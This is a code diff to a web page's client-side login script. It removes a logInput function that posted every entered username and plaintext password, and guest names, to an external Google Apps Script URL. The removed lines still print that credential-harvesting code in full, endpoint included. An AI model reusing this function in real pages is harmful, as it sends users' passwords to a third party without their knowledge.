@@ -28,9 +28,9 @@
         if (username === "guest") {
           const guestName = prompt("Enter your name:");
           if (guestName) {
-            logInput(username, guestName); // Log the guest name instead of a password
+            // Show the page content
             document.body.innerHTML = `<h1>Access Granted</h1><p>Welcome, Guest (${guestName})!</p>`;
-            document.body.style.display = "block"; // Show the page content
+            document.body.style.display = "block";
             return; // Exit the validation loop
           } else {
             alert("Name cannot be empty. Please try again.");
@@ -48,35 +48,18 @@
         if (!authenticated) {
           alert("Incorrect username or password. Please try again.");
         } else {
-          logInput(username, password); // Log regular username and password
-          document.body.style.display = "block"; // Show the page content
+          // Show the page content
+          document.body.innerHTML = `<h1>Access Granted</h1><p>Welcome, ${username}!</p>`;
+          document.body.style.display = "block";
         }
       }
     }
     
-    function logInput(username, input) {
-  fetch("https://script.google.com/macros/s/AKfycbx-XMEO37A4k4u_RnIjcrdid9AFbkCAftsyZUaCgGr7Ihlqc_jAhZ02eTY_OF6Vf8RU/exec", {
-    method: "POST",
-    mode: "cors", // Explicitly handle CORS
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ username: username, input: input })
-  })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error(`HTTP error! Status: ${response.status}`);
-    }
-    return response.text();
-  })
-  .then(data => console.log("Logged successfully:", data))
-  .catch(error => console.error("Error logging input:", error));
-}
-    
     // Call the login validation function
     validateLogin();
   });
-  </script>
+</script>
+
 
 
 <title>Custom Functions</title>
